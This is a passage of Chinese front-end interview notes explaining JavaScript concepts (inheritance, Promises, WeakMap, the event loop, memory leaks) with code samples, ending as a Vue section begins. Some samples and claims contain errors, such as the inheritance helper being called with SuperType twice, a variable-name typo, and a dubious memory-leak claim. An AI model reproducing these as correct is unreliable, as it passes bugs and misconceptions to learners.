};

input.oninput = inputEvent(function() {
    console.log(this.value);
}, 500);
```

## async/await 实现原理（Promise与生成器的语法糖）（待解决！！！！！）

待解决！！！！！

## const赋值的引用类型可以被改变（只是地址值不能改变）

想要修改一开始就赋值基础数据类型的 const 声明的变量是会报错的

```js
const same = 'good code';
same = 123;  // 报错：Assignment to constant variable.
```

如果只是修改 const 声明的引用类型的熟悉是 ok 的

```js
const obj = {
    name: 'leo', 
    age: 20
};

// 修改对象的属性
obj.name = 'cool guy';

console.log(obj);  // name: 'cool guy', age: 20}
```

但是如果是给其变量重新赋值一个新对象是会报错的

```js
const obj = {
    name: 'tim'
};

// 赋值新对象
obj = {
    name: 'Bob'
};
// 报错：Assignment to constant variable.
```

## JS中有哪些继承

> 组合继承

就是**原型链**和**盗用构造函数**的结合体

```js
/* 
    组合继承
    存在的问题：调用两次 Animal 构造函数，为 Dog.prototype 增加了许多无用属性
*/
function Animal(name, call) {
    this.name = name;
    this.call = call;
    this.body = ['eyes', 'legs', 'mouth'];
}
Animal.prototype.getName = function() {
    console.log(this.name);
}

function Dog() {
    // 继承 Animal 并传参
    Animal.call(this, ...arguments);
    // 获取最后一个参数
    let lastArgs = Array.prototype.pop.call(arguments);
    this.legs = lastArgs;
}

// 原型链的核心代码
Dog.prototype = new Animal();
Dog.prototype.sayLegs = function() {
    console.log(this.legs);
}

let dog1 = new Dog('小黑', '汪汪', 4);
console.log(dog1);
dog1.getName();  // 小黑
dog1.sayLegs();  // 4
```

> 原型式继承

`Object.create()` 方法将原型式继承的概念规范化

```js
/* 
    原型式继承
    适用情况：你有一个对象，想在它的基础上再创建一个新对象。 你需要把
            这个对象先传给 object()，然后再对返回的对象进行适当修改

    `Object.create()` 方法将原型式继承的概念规范化
*/
// 核心代码
function object(o) {
    function Foo() {}
    Foo.prototype = o;
    // 就是为了让返回的实例指向 Foo 的原型对象
    return new Foo();
}

let animal = {
    species: '哺乳动物',
    body: ['eyes', 'legs']
};

let dog = object(animal);
dog.name = '小黑';
dog.body.push('mouth');

let cat = object(animal);
cat.name = '小咪';
cat.body.push('fur');

console.log(dog);  // Foo {name: '小黑'}
console.log(cat);  // Foo {name: '小咪'}
console.log(animal);  // {species: '哺乳动物', body: ['eyes', 'legs', 'mouth', 'fur']}
```

> 寄生式继承

```js
/* 
    寄生式继承
        - 与原型式继承比较接近的一种继承方式是寄生式继承
*/
function object(o) {
    function Foo() {}
    Foo.prototype = o;
    // 就是为了让返回的实例指向 Foo 的原型对象
    return new Foo();
}
// 核心代码
function createAnother(original) {
    let clone = object(original);
    clone.sayHello = function() {
        console.log('Hello!!');
    }
    return clone;
}

let animal = {
    species: '哺乳动物',
    body: ['eyes', 'legs']
};

let dog = createAnother(animal);
dog.name = 'dr.black';
console.log(dog);  // Foo {name: 'dr.black', sayHello: ƒ}
dog.sayHello();  // Hello!!
```

> 寄生式组合继承

其中`createAnother`核心代码的步骤图：

![](https://tva1.sinaimg.cn/large/008i3skNgy1gz7csgfaj1j30ty0p4mzi.jpg)

```js
/* 
    寄生式组合继承 
        - 解决组合继承调用两次父类构造函数的情况，使子类原型上没有多余属性
        - 综合前面的所有继承，最佳实践
*/
function object(o) {
    function Foo() {}
    Foo.prototype = o;
    // 就是为了让返回的实例指向 Foo 的原型对象
    return new Foo();
}
// 核心代码
function createAnother(SubType, SuperType) {
    let prototype = object(SuperType.prototype);  // 创建对象
    prototype.constructor = SubType;  // 增强对象
    SubType.prototype = prototype;  // 赋值对象
}

function SuperType(name, age) {
    this.name = name;
    this.age = age;
    this.colors = ['blue', 'red', 'green'];
}
SuperType.prototype.sayName = function () {
    console.log(this.name);
};

function SubType() {
    SuperType.call(this, ...arguments);
    let hobbyArg = Array.prototype.pop.call(arguments);
    this.hobby = hobbyArg;
}

// 实现寄生
createAnother(SuperType, SuperType);

SubType.prototype.sayAge = function () {
    console.log(this.age);
};

// new 实例
let instance = new SubType('leo', 20, 'dance');
console.log(instance);  
// SubType {name: 'leo', age: 20, colors: ['blue', 'red', 'green'], hobby: 'dance'}
```

## 数组和伪数组的区别？为什么要设置成伪数组？

> 数组和伪数组的区别：

```js
// 1. 数组使用 Array.isArray() 返回 true， 而伪数组 Array.isArray() 返回 false
// 2. 数组（对象）的 [[Prototype]] 是 Array.prototype， 而伪数组的 [[Prototype]] 是 Object.prototype
```

> 为什么要设置成伪数组？

为了让对象能够使用一些数组的方法，方便编程

```js
let obj = {
    name: 'leo', 
    age: 21, 
};
[].push.call(obj, 'new property');
[].push.call(obj, 'new property-2');
console.log(obj);  // {0: 'new property', 1: 'new property-2', name: 'leo', age: 21, length: 2}
```

**这里的 length 会根据元素的添加而改变！**

## 说说你经常使用到的array方法

```js
总结：
  - 修改原数组： pop push shift unshift splice | reverse sort
  - 不修改原数组： slice forEach concat join | map reduce filter some every

pop: 返回删除的数组的尾部元素
push: 返回添加尾部元素后的数组长度
shift: 返回删除的数组的头部元素
unshift: 返回添加头部元素后的数组长度
splice: 返回一个数组（ 里面的元素是删除的元素）

reverse: 反转原数组,返回反转后的原数组
sort: 排序原数组, 返回排序后的原数组

slice: 返回一个划分的一个新数组
forEach: 返回值为 undefined
concat: 返回添加元素后的新数组
join: 返回一个字符串

map、 filter: 返回一个新数组
some、 every: 返回一个布尔值
reduce: 返回一个数字类型（ number类型）
```

## js数据类型，怎么区别array和object

```js
/* 
    js数据类型，怎么区别array和object
*/
let arr = [];
let obj = {};

// 1. Array.isArray
console.log(Array.isArray(arr));  // true
console.log(Array.isArray(obj));  // false
// 2. instanceof
console.log(arr instanceof Array);  // true
console.log(obj instanceof Array);  // false
// 3. 从迭代器的角度(判断是否可迭代)
for(let ele of arr) {
    console.log(ele);
}
for(let ele of obj) {
    console.log(obj);   // 报错
}

// 注意：typeof 判断不了！！!
console.log(typeof arr);  // object
console.log(typeof obj);  // object
```

## Undefined与Null的区别

### 一、基本数据类型

在介绍undefined与null之前，我们先来了解一下ECMAScript中的数据类型。在ECMAScript中有六种简单数据类型(也称为基本数据类型): Undefined、Null、Boolean、Number 和 String、Symbol (ES6中引入) 、BigInt。还有一种复杂数据类型——Object。

Undefined和Null都只有一个值，分别对应着undefined和null。这两种不同类型的值，既有着不同的语义和场景，又表现出较为相似的行为。

### 二、undefined

undefined 的字面意思就是：未定义的值 。这个值的语义是，希望表示一个变量最原始的状态，而非人为操作的结果 。 这种原始状态会在以下 4 种场景中出现：

#### **1、声明一个变量，但是没有赋值**

```js
var foo;
console.log(foo); // undefined
```

访问 foo，返回了 undefined，表示这个变量自从声明了以后，就从来没有使用过，也没有定义过任何有效的值。

#### **2、访问对象上不存在的属性或者未定义的变量**

```js
console.log(Object.foo); // undefined
console.log(typeof demo); // undefined
```

访问 Object 对象上的 foo 属性，返回 undefined ， 表示Object 上不存在或者没有定义名为 foo 的属性；对未声明的变量执行typeof操作符返回了undefined值。

#### **3、函数定义了形参，但没有传递实参**

```js
//函数定义了形参 a
function fn(a) {
    console.log(a); // undefined
}
fn(); //未传递实参
```

函数 fn 定义了形参 a，但 fn 被调用时没有传递参数，因此，fn 运行时的参数 a 就是一个原始的、未被赋值的变量。

#### **4、使用void对表达式求值**

```js
void 0 ; // undefined
void false; // undefined
void []; // undefined
void null; // undefined
void function fn(){} ; // undefined
```

ECMAScript 明确规定 void 操作符 对任何表达式求值都返回 undefined ，这和函数执行操作后没有返回值的作用是一样的，JavaScript 中的函数都有返回值，当没有 return 操作时，就默认返回一个原始的状态值，这个值就是 undefined，表明函数的返回值未被定义。

因此，undefined 一般都来自于某个表达式最原始的状态值，不是人为操作的结果。当然，你也可以手动给一个变量赋值 undefined，但这样做没有意义，因为一个变量不赋值就是 undefined 。

### 三、null

null 的字面意思是：空值 。这个值的语义是，希望表示一个对象被人为的重置为空对象，而非一个变量最原始的状态 。 在内存里的表示就是，栈中的变量没有指向堆中的内存对象。

#### **1、一般在以下两种情况下我们会将变量赋值为null**

- 如果定义的变量在将来用于保存对象，那么最好将该变量初始化为null，而不是其他值。换句话说，只要意在保存对象的变量还没有真正保存对象，就应该明确地让该变量保存null值，这样有助于进一步区分null和undefined。

- 当一个数据不再需要使用时，我们最好通过将其值设置为null来释放其引用，这个做法叫做解除引用。不过解除一个值的引用并不意味着自动回收改值所占用的内存。解除引用的真正作用是让值脱离执行环境，以便垃圾收集器在下次运行时将其回收。解除引用还有助于消除有可能出现的循环引用的情况。这一做法适用于大多数全局变量和全局对象的属性，局部变量会在它们离开执行环境时(函数执行完时)自动被解除引用。

#### **2、特殊的typeof null**

当我们使用typeof操作符检测null值，我们理所应当地认为应该返"Null"类型呀，但是事实返回的类型却是"object"。

```js
var data = null;
console.log(typeof data); // "object"
```

是不是很奇怪？其实我们可以从两方面来理解这个结果:

- 一方面从逻辑角度来看，null值表示一个空对象指针，它代表的其实就是一个空对象，所以使用typeof操作符检测时返回"object"也是可以理解的。

- 另一方面，其实在JavaScript 最初的实现中，JavaScript 中的值是由一个表示类型的标签和实际数据值表示的(对象的类型标签是 0)。由于 null 代表的是空指针（大多数平台下值为 0x00），因此，null的类型标签也成为了 0，typeof null就错误的返回了"object"。在ES6中，当时曾经有提案为历史平凡, 将type null的值纠正为null, 但最后提案被拒了,所以还是保持"object"类型。

### 四、总结

用一句话总结两者的区别就是：undefined 表示一个变量自然的、最原始的状态值，而 null 则表示一个变量被人为的设置为空对象，而不是原始状态。所以，在实际使用过程中，为了保证变量所代表的语义，不要对一个变量显式的赋值 undefined，当需要释放一个对象时，直接赋值为 null 即可。

## 手写 reduce 方法

```js
Array.prototype.myreduce = function (callback, initValue) {
    if (this === null) {
        throw new TypeError(
            "Array.prototype.reduce called on null or undefined"
        );
    }
    if (!Array.isArray(this)) {
        throw new TypeError("not a array")
    }
    if (typeof callback !== "function") {
        throw new TypeError(callback + " is not a function");
    }
    // 数组为空，并且没有初始值时，抛出异常
    if (this.length === 0 && arguments.length < 2) {
        throw new TypeError('Reduce of empty array with no initial value')
    }

    const length = this.length;
    let acc = typeof initValue === "undefined" ? this[0] : initValue;
    let curIdx = typeof initValue === "undefined" ? 1 : 0;

    while (curIdx < length) {
        acc = callback(acc, this[curIdx], curIdx, this);
        curIdx++;
    }
    return acc;
}

let arr = [1, '2', 3];
let sum = arr.reduce((pre, cur) => {
    return pre + cur;
}, 3);
let sum2 = arr.myreduce((pre, cur) => {
    return pre + cur;
}, 3);

console.log(sum);   // 423
console.log(sum2);  // 423
```

## **手写Promise核心代码**

```js
/* 
    - Promise 存在三种状态：1.pending 2.fulfilled 3.rejected
    注意的细节：
        - 细节一：当func函数中存在异常：需要通过try进行捕获
        - 细节二：原生Promise规定then里面的两个参数如果不是函数的话就会被忽略
        - 细节三：resolve()和reject()是要在事件循环末尾执行
    - 实现链式功能：then返回一个new Promise
*/

class MyPromise {
    static PENDING = '待定';
    static FULFILLED = '成功';
    static REJECTED = '拒绝';
    constructor(func) {
        // 默认为待定状态
        this.status = MyPromise.PENDING;
        // 结果参数（不论成功或者拒绝）
        this.result = null;
        // 创建数组保留then中的函数
        this.resolveCallbacks = [];  // 保存 resolve 函数
        this.rejectCallbacks = [];  // 保存 reject 函数

        // 细节一：捕获func函数中抛出的异常
        try {
            // 这里需要使用bind为resolve函数设置this指向
            func(this.resolve.bind(this), this.reject.bind(this));
        } catch (error) {
            this.reject(error);            
        }
    }
    resolve(result) {
        // 细节三；所以要加上setTimeout
        setTimeout(() => {
            if(this.status === MyPromise.PENDING) {
                this.status = MyPromise.FULFILLED;
                this.result = result;
                // 执行 resolveCallbacks 数组中的待执行函数
                this.resolveCallbacks.forEach(callback => {
                    callback(result);
                })
            }
        });
    }
    reject(result) {
        // 细节三；所以要加上setTimeout
        setTimeout(() => {
            if(this.status === MyPromise.PENDING) {
                this.status = MyPromise.REJECTED;
                this.result = result;
                // 执行 rejectCallbacks 数组中的待执行函数
                this.rejectCallbacks.forEach(callback => {
                    callback(result);
                })
            }
        });
    }
    then(onFulfilled, onRejected) {
        // 实现链式功能
        return new MyPromise((resolve, reject) => {
            // 细节二：需要先判断传入的参数是否是函数（是否会被忽略）
            onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : () => {};
            onRejected = typeof onRejected === 'function' ? onRejected : () => {};
            if(this.status === MyPromise.PENDING) {
                // 保留then里的函数，稍后执行（所以通过创建数组来保留函数）
                this.resolveCallbacks.push(onFulfilled);
                this.rejectCallbacks.push(onRejected);
            }
            if(this.status === MyPromise.FULFILLED) {
                setTimeout(() => {
                    onFulfilled(this.result);
                });
            }
            if(this.status === MyPromise.REJECTED) {
                setTimeout(() => {
                    onRejected(this.result);
                });
            }
        })
    }
}

/* 
    执行过程：
    1. 首先执行同步代码: console.log('1');
    2. 接着执行同步代码：console.log('2');
    3. 遇到 setTimeout 这一块的异步代码，先跳过
    4. 执行 promise.then，通过查阅手写代码，此时的 status 为 pending，
       所以先将then的参数（onFulfilled函数和onRejected函数）存入对应
       数组（resolveCallbacks数组和rejectCallbacks数组）
    5. 再回头执行刚才的 setTimeout 里的代码，首先执行的 resolve('这次一定');
       通过查看手写代码，发现这个函数又是异步代码（细节三：resolve()和reject()是要在事件循环末尾执行），
       所以先跳过
    6. 执行后一步的 console.log('4');
    7. 最后执行 resolve('这次一定');，遍历 resolveCallbacks 数组中的待执行函数
*/
console.log('1');
let promise = new MyPromise((resolve, reject) => {
    console.log('2');
    setTimeout(() => {
        resolve('这次一定');
        console.log('4');
    });
});
promise.then(
    result => {console.log(result);},
    result => {console.log(result.message);}
)
console.log('3');
// 执行顺序：1 2 3 4 这次一定
```

这里的第一种情况，可根据上面的解释，一样判断（**那就是 `resolve()`，最后执行，先执行 `promise.then()` )**

```js
// 第一种情况
console.log('1');
let promise = new Promise((resolve, reject) => {
    console.log('2');
    resolve('这次一定');
});
promise.then(
    result => {console.log(result);},
    result => {console.log(result.message);}
)
console.log('3');
// 执行顺序：1 2 3 这次一定


// 第二种情况
console.log('1');
let promise = new Promise((resolve, reject) => {
    console.log('2');
    setTimeout(() => {
        resolve('这次一定');
        console.log('4');
    });
});
promise.then(
    result => {console.log(result);},
    result => {console.log(result.message);}
)
console.log('3');
// 执行顺序：1 2 3 4 这次一定
```

要是不懂可以再看一遍：[技术蛋老师，手写Promise核心代码](https://www.bilibili.com/video/BV1RR4y1p7my/?spm_id_from=333.788)

## 手写`Promise.`的各个方法

### Promise.resolve

Promsie.resolve(value) 可以将任何值转成值为 value 状态是 fulfilled 的 Promise，但如果传入的值本身是 Promise 则会原样返回它。

```js
Promise.resolve = function(value) {
    if(value instanceof Promise) {
        return value;
    }
    return new Promise(resolve => resolve(value));
}
```

### Promise.reject

和 Promise.resolve() 类似，Promise.reject() 会实例化一个 rejected 状态的 Promise。但与 Promise.resolve() 不同的是，如果给 Promise.reject() 传递一个 Promise 对象，则这个对象会成为新 Promise 的值。

```js
Promise.reject = function(reason) {
    return new Promise((resolve, reject) => {
        reject(reason);
    })
}
```

### Promise.all

Promise.all 的规则是这样的：

- 传入的所有 Promsie 都是 fulfilled，则返回由他们的值组成的，状态为 fulfilled 的新 Promise；
- 只要有一个 Promise 是 rejected，则返回 rejected 状态的新 Promsie，且它的值是第一个 rejected 的 Promise 的值；
- 只要有一个 Promise 是 pending，则返回一个 pending 状态的新 Promise；

```js
Promise.all = function(promiseArr) {
    let count = 0;
    let result = [];
    return new Promise((resolve, reject) => {
        promiseArr.forEach((itemPromise, index) => {
            // 这里套不套 Promise.resolve() 都可以
            Promise.resolve(itemPromise).then(res => {
                // 执行成功的promise数量加1
                count++;
                /* 
                    将每一个执行成功的promise的值存入数组result，
                    最后作为resolve的参数返回
                */
                result[index] = res;
                if(count == promiseArr.length) {
                    resolve(result);
                }
            }, reason => {
                reject(reason);
            })

        })
    })
}
```

### Promise.race

Promise.race 会返回一个由所有可迭代实例中第一个 fulfilled 或 rejected 的实例包装后的新实例。

```js
Promise.race = function(promiseArr) {
    return new Promise((resolve, reject) => {
        promiseArr.forEach(itemPromise => {
            Promise.resolve(itemPromise).then(res => {
                resolve(res);
            }, reason => {
                reject(reason);
            })
        })
    })
}
```

### Promise.any

Promise.any 的规则是这样：

- 空数组或者所有 Promise 都是 rejected，则返回状态是 rejected 的新 Promsie，且值为 AggregateError 的错误；
- 只要有一个是 fulfilled 状态的，则返回第一个是 fulfilled 的新实例；
- 其他情况都会返回一个 pending 的新实例；

```js
Promise.any = function(promiseArr) {
    // 被拒绝的个数
    let count = 0;
    return new Promise((resolve, reject) => {
        if(promiseArr.length == 0) return ;
        promiseArr.forEach((promiseItem, index) => {
            Promise.resolve(promiseItem).then(res => {
                resolve(res);
            }, reason => {
                count++;
                if(count == promiseArr.length) {
                    reject(new AggregateError('All promises were rejected'));
                }
            })
        });
    })
}
```

## Map和WeakMap、Set和WeakSet的区别

### Set和WeakSet

```js
  let set =new Set(),key={};
  set.add(key)
  console.log(set.size) //1
  //移除原始引用
  key=null
  console.log(set.size) //1
  key=[...set][0] //取回原始引用
```

> WeakSet由来

从上面的例子中发现, 我们移除了原始引用 key 后, 还是可以在 set 中访问到 key 这个引用类型, 是因为 set 存在对这个 key 对象的强引用, 导致我们还能访问到 key, 这样的话会导致内存无法释放, 进而导致内存泄漏. 为了解决这个问题, 可以使用 WeakSet !

> WeaKSet的弱引用

因为其弱引用的特性:

1. WeakSet 成员只能是引用类型

2. 不能使用 for-of、forEach 等 (可以查看其并未实现 Symbol.iterator )

3. 因为弱引用， WeakSet 结构没有`keys()`，`values()`，`entries()`等方法和`size`属性 

> 一般使用场景

* WeakSet 适合临时存放一组对象，以及存放跟对象绑定的信息

具体一个场景就是存储DOM对象，当我们存储的DOM对象元素被另外一段脚本移除，我们也不想保留这些元素的引用而造成内存泄漏，就可以使用WeakSet来存储。

```js
const ws = new WeakSet();
document.querySelectorAll("button").forEach(item => Ws.add(item));
```

### Map和WeakMap

1. `Map`的`key`可以是任意类型；`WeakMap`的`key`只能是引用类型

2. `Map`的成员是强引用，垃圾回收需要考虑`Map`中的引用；而`WeakMap`的成员是弱引用，垃圾回收不需要考虑`WeakMap`中的引用；
   
   ```js
   /* 
       Map和WeakMap引用区别
   */
   let map = new Map();
   let obj = {
       name: 'leo'
   };
   map.set(obj, 'leo')
       .set(11, 'kang');
   obj = null; // 垃圾回收obj
   console.log(map); // Map(2) {{…} => 'leo', 11 => 'kang'}
   
   let wm = new WeakMap();
   let obj2 = {
       name: 'dong'
   };
   wm.set(obj2, 'bro');
   obj2 = null; // 垃圾回收obj2
   /*
       注意：浏览器显示对象内部也许有内容，
       这是因为我们不知道垃圾回收的具体启动时间，
       所以显示的是还没有垃圾回收的样子
   */
   console.log(wm); // WeakMap {}
   ```

> WeakMap的弱引用

1. WeakMap的key必须是非null的对象,value可以是任意类型

2. WeaMap对键名(key)是弱引用的，键值(value)是正常引用

3. 不能使用 for-of、forEach 等 (可以查看其并未实现 Symbol.iterator )

4. 因为弱引用， WeakSet 结构没有`keys()`，`values()`，`entries()`等方法和`size`属性

> 一般使用场景

* 存储DOM元素

将一个 DOM 节点作为键名存入该实例，并将一些附加信息作为键值，一起存放在 WeakMap 里面。这时，WeakMap 里面对`element`的引用就是弱引用，一旦将这个 DOM 节点删除，该`element`对象就会自动被垃圾回收机制清除，不存在内存泄漏风险。

```js
<body>
  <div>bar</div>
  <div>foo</div>
</body>
<script>
  const wm = new WeakMap();
  document
    .querySelectorAll("div")
    .forEach(item => wm.set(item, item.innerHTML));
  console.log(wm); //WeakMap {div => "bar", div => "foo"}
</script>
```

* 存储私有变量

ES5中我们经常利用立即执行函数的方式来设置私有变量，但问题是私有变量不会随着实例对象的销毁被回收，WeakMap正好可以解决这个问题。

```js
let Person = (function () {
    let privateData = new WeakMap();
    function Person(name) {
        privateData.set(this, {
            name
        })
    }
    Person.prototype.getName = function () {
        return privateData.get(this).name;
    }
    return Person;
}())

let person = new Person('leo');
let res = person.getName();
console.log(person);  // Person {}
console.log(res);  // leo
```

当调用Person构造函数时，实例就会被添加到WeakMap集合中，键是this, 是实例的弱引用，值是私有属性name的对象， 如果删除实例，私有属性也就随之消失，不会造成内存泄漏。

## 什么是事件冒泡、事件委托、事件三阶段

### 事件三阶段

1. 捕获阶段

2. 目标阶段

3. 冒泡阶段（**事件在此阶段触发**）

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzghfa1oe5j210a0oggon.jpg)

### 事件冒泡

当big、middle、small元素都有事件时，点击内部的small元素，会从内向外（`small -> middle -> big`）的触发事件

### 事件委托

> 其实就是利用了事件冒泡的原理，通过给父级元素添加事件，从而让子级拥有对应的事件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <!-- 添加li元素 -->
    <input type="text" id="content">
    <button id="addLi">添加li元素</button>

    <ul>
        <li>香蕉</li>
        <li>西瓜</li>
        <li>苹果</li>
    </ul>

    <script>
        /* 
            实现：点击对应li标签，就删除该li标签
        */
        // 方式一：不利用事件委托（新增li需要单独添加删除的事件）
        let lis = document.querySelectorAll('li');
        let ul = document.querySelector('ul');
        for (let i = 0; i < lis.length; i++) {
            // 给每一个li元素添加点击事件
            lis[i].onclick = function () {
                // 删除点击的li节点
                ul.removeChild(this);
            }
        }

        /* 
            方式二：利用事件委托（给父级元素ul添加事件），
            这样一来，即使我后期再添加li元素，我就不用再单独
            给新增的li元素添加事件
        */
        // let ul = document.querySelector('ul');
        // ul.onclick = function(e) {
        //     this.removeChild(e.target);
        // }

        // 添加新的li元素
        let btn = document.querySelector('#addLi');
        let inputText = document.querySelector('#content');
        btn.onclick = function() {
            // 新建li标签
            let newLi = document.createElement('li');
            newLi.innerText = inputText.value;
            ul.appendChild(newLi);
        }
    </script>

</body>

</html>
```

## addEventListener 的第三个参数

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <div class="container" style="width: 200px;height: 200px;background-color: brown;">
        <div class="box" style="width: 100px;height: 100px;background-color: blue;"></div>
    </div>

    <script>
        /* 
            addEventListener的第三个参数
                - 默认为false，指事件在冒泡阶段触发
                - true，指事件在捕获阶段触发
        */ 
        let container = document.querySelector('.container');
        let box = document.querySelector('.box');
        box.addEventListener('click', function () {
            console.log('我是box');
        }, true)
        container.addEventListener('click', function () {
            console.log('我是container');
        }, true)
    </script>
</body>

</html>
```

## 手写实现LRU算法

```js
/**
 * @param {number} capacity 容器存储容量
 */
var LRUCache = function (capacity) {
    // 设置一个Map集合
    this.map = new Map();
    this.capacity = capacity;
};

/** 
 * @param {number} key
 * @return {number}
 */
LRUCache.prototype.get = function (key) {
    if(this.map.has(key)) {
        let temp = this.map.get(key);
        this.map.delete(key);
        this.map.set(key, temp);
        return temp;
    }else {
        return -1;
    }
};

/** 
 * @param {number} key 
 * @param {number} value
 * @return {void}
 */
LRUCache.prototype.put = function (key, value) {
    if(this.map.has(key)) {
        this.map.delete(key);
    }
    this.map.set(key, value);
    if(this.map.size > this.capacity) {
        // 获取头部要删除的key
        let headVal = this.map.keys().next().value;
        this.map.delete(headVal);
    }
};

/**
 * Your LRUCache object will be instantiated and called as such:
 * var obj = new LRUCache(capacity)
 * var param_1 = obj.get(key)
 * obj.put(key,value)
 */
```

ES6的实现方式：[【Q249】使用 js 实现一个 lru cache | js,code高频面试题 | 大厂面试题每日一题](https://q.shanyue.tech/fe/code/251.html)

## 导致内存泄漏的情况

1. 意外全局变量
   
   ```js
   function aa(){
      bb = 15;
   }
   ```

2. 闭包引起的内存泄漏

3. 被遗忘的计时器 / 回调函数
   
   ```js
   // setInterval()这个函数若没有设计停止机制的话，它是会一直执行下去的
   let a=[]
   setInterval(function(){
       a.push(1)
   })
   
   // 老版本的ie无法检测到Dom节点之间的循环引用，会导致内存泄漏（新浏览器不会）
   let element=document.getElementById('button')
   function onClick(){
       element.innerHtml='text'
   }
   element.addEventListener('click',onClick)
   ```

4. dom引用
   
   ```js
   let gogo=document.getElementByid('gogo')
   
   // 这样删除dom没问题
   document.body.removeChild(document.getElementByid('gogo'))
   
   // 这样删除有问题,通过引用的gogo对象来删除,会导致内存泄漏
   document.body.removeChild(gogo)
   ```

自测题: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/profile/109395575/myFollowings/detail/22342783)

## 事件循环机制(浏览器和node)

对于 Event Loop , 可以参考:  https://www.youtube.com/watch?v=8aGhZQkoFbQ

这个视频介绍 js 是一个单线程, 有一个 `Call Stack` 作为主执行栈, 对同步代码进行执行, 如果在这个过程中遇到了像`setTimeout、setInterval、Dom Event、AJAX等这样的异步任务`, 会先将任务添加到 `WebAPIs`中等待, 当异步任务计时完成或返回时, 将被放入 `Task Queue` 进行等待, 当`Call Stack`中执行完毕(清理干净)后, 则从`Task Queue`中取出第一个任务回调函数进行执行

下面通过一段代码进行证明:

```js
let start = Date.now();
/* 
    即使定时器的等待时间设置为 0ms, 
    但也是先打印花费了13ms左右的for循环执行时间, why?

    因为 callback() 0ms 后从 WebAPIs 被推入到 task queue, 
    但是由于此时的 satck 中的执行任务没有清空, 所以也不会放入
    stack 中执行, 而是要等到 stack 中清理完后才放入执行
*/
setTimeout(function callback() {
    console.log('定时器中的打印');
}, 0);

let count = 0;
for (let i = 0; i < 10000000; i++) {
    count++;
}
let end = Date.now();
console.log(end - start + 'ms');
/* 
    除此之外, ajax请求、以及对 Dom event 的执行情况也是这样
*/
```

打印结果:

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1f35uf59vj20a803a3ye.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1f3gsxi0yj20wr0u0dis.jpg)

### 浏览器的事件循环机制:

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1bci72w93j20hg03o74g.jpg)

首先整体的JS代码就是一个宏任务, 在这个宏任务执行过程中, 如果遇到微任务就将其加入微任务队列, 遇到宏任务就将其加入宏任务队列, 然后当前JS代码执行完毕就出栈, 然后执行刚才的微任务队列中的**所有**任务(清空微任务队列), 然后执行渲染操作和worker相关任务, 最后又从头开始循环, 从宏任务队列中取出最前面的任务放入执行栈中执行.

```js
setTimeout(()=>{
    console.log('timer1')
    Promise.resolve().then(function() {
        console.log('promise1')
    })
}, 0)
setTimeout(()=>{
    console.log('timer2')
    Promise.resolve().then(function() {
        console.log('promise2')
    })
}, 0)
```

浏览器端运行结果：`timer1=>promise1=>timer2=>promise2`

 ![](https://pic2.zhimg.com/v2-d1ca0d6b13501044a5f74c99becbcd3d_b.webp)

### node事件循环机制

node事件循环机制和浏览器完全不同, 通过 libuv 引擎分为六个阶段:

`poll(incoming) -> check -> close callbacks -> timer -> I/O callbacks -> idle prepare -> poll`

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1bcsk0at8j209z09774h.jpg)

其中最主要的三个阶段就是:`poll、check、timer`

对于刚才的那端代码, 在`Node10版本及之前`运行流程和结果如下

```js
setTimeout(()=>{
    console.log('timer1')
    Promise.resolve().then(function() {
        console.log('promise1')
    })
}, 0)
setTimeout(()=>{
    console.log('timer2')
    Promise.resolve().then(function() {
        console.log('promise2')
    })
}, 0)
```

Node10版本端运行结果：`timer1=>timer2=>promise1=>promise2`

![](https://pic1.zhimg.com/v2-963090bd3b681de3313b4466b234f4f0_b.webp)

<mark>但是在Node12及以后越来越趋于规范化, 执行结果就同浏览器一样了!!</mark>

### 浏览器和Node事件循环区别

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1bd2k7wibj20t709kmy3.jpg)

参考: https://zhuanlan.zhihu.com/p/54882306

## ES6模块与CommonJS的区别

总结: 

1. ES6模块输出值的引用, CommonJS输出值的拷贝
   
   ES6模块不缓存运行结果, 会动态的去引入文件中取值, 变量总是绑定所在模块; 而CommonJS会缓存结果, 不会动态的去引入模块中取值.

2. ES6是编译时加载(静态加载只需要的几个方法), CommonJS是运行时加载(加载所有方法)

3. ES6异步加载, CommonJS是同步加载

参考: [CommonJS和ES6模块有什么区别! - 掘金](https://juejin.cn/post/7048139060983889950)

# Vue

## 简单说下MVVM和MVC的区别

> MVC

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy0h12e8icj30f409y74b.jpg)

MVC的核心在于使用 Controller 将 Model 数据显示在 View 上（在 MVC 中，用户在 View 上事件操作，都是通过 JS 监听事件，然后通过 AJAX 请求 Controller 中的路由，也就是说 MVC 并没有涉及 View -> Controller 和 View -> Model ）

> MVVM

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy0haw8s25j30fq08r3yj.jpg)

MVVM 重心在于实现 View 和 Model 的数据自动同步，而非手动操作 DOM 元素

> 总结

整体看来，MVVM 比 MVC 精简很多，不仅简化了业务与界面的依赖，还解决了数据频繁更新的问题，不用再用选择器操作 DOM 元素。因为在 MVVM 中，View 不知道 Model 的存在，Model 和 ViewModel 也观察不到 View，这种低耦合模式提高代码的可重用性。

## 为什么 data 是一个函数

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy0iulwhlaj30eh0jeq43.jpg)

每一次复用组件时，希望各自组件的数据不会相互影响，所以将 data 设置为函数，每次返回一个新对象。这样以来，多次复用的组件之间的 data 数据不会相互关联，如果单纯的写成对象形式，那么每处使用这个组件的地方都会通过引用而找到这唯一的数据，就会出现改动一处全都改变的情况。

## Vue 组件通讯有哪几种方式

1. props 和 `$emit` (父传子通过 props，子传父通过 `$emit`触发事件进行传递)

2. `$refs`获取组件实例 
   
   父组件
   
   ```js
   this.$refs.foo // 获取子组件实例，通过子组件实例我们就能拿到对应的数据
   ```

